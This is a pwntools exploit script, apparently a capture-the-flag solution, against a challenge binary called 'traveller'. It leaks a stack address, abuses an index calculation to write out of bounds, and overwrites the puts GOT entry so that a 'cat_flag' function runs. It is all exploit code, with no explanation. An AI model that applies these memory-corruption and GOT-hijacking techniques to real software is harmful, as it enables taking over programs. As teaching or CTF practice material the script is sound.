from pwn import *

elf = ELF('./traveller')
p = process('./run.sh')

dists = {
    0x80:  1, 0x110: 2, 0x128: 3, 0x150: 4, 0x200: 5
}

def calc_offset(addr):
    assert addr % 8 == 0
    trips = elf.symbols.trips
    if addr < trips:
        return (addr - trips) // 8

    return 0x8000000000000000 | (addr - trips) // 8

def choice(ch):
    p.sendlineafter('> ', str(ch))

def add(dist, name):
    choice(1)
    p.sendlineafter('Distance:', str(dists[dist]))
    p.sendlineafter('Destination: ', name)

def change(ind, content):
    choice(2)
    pause()
    p.sendline(str(ind))
    p.send(content)

def delete(ind):
    choice(3)
    p.sendlineafter('delete: ', ind)

def check(ind):
    choice(4)
    assert len(str(ind)) <= 3
    p.sendlineafter('>', ind)
    return p.recvuntil(' \n1. Add a trip', drop=True)

pause()

p.recvuntil('0x')
addr_argc = int(p.recvline(), 16)

# prepare
change(calc_offset(addr_argc - 132), 'A' * 7 + p64(addr_argc + 36) +
        p64(elf.got.puts - 8) + p64(0x10))

change(calc_offset(addr_argc + 20), 'A' * 7 + p64(elf.symbols.cat_flag))

change(calc_offset(0x400578), p64(elf.symbols.cat_flag)[:7])
p.interactive()
